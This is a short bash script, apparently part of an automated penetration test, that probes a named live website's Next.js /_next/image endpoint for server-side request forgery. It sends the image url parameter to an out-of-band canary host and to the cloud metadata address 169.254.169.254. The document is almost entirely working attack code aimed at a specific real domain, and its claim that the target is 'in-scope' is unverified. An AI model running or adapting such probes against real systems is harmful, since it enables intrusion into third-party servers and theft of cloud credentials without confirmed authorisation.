#!/bin/bash
# SSRF test against in-scope /_next/image optimizer url= sink via OOB canary.
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE="https://www.infinitycapital.bh/_next/image"
H=$(cat "$WORK_PATH/tool_outputs/canary_host.txt")
echo "canary=$H"
probe() {
  local label="$1"; local payload="$2"
  local out
  out=$(curl -s -A "$UA" -o "$WORK_PATH/tool_outputs/ss_out_$label" -D "$WORK_PATH/tool_outputs/ss_hdr_$label" -w "%{http_code}|%{size_download}|%{content_type}" --max-time 30 -G --data-urlencode "url=$payload" --data "w=256" "$BASE")
  echo "[$label] payload=$payload -> $out"
  sleep 3
}
probe "http"  "http://$H/ssrf-canary.png"
probe "https" "https://$H/ssrf-canary.png"
probe "meta"  "http://169.254.169.254/latest/meta-data/"
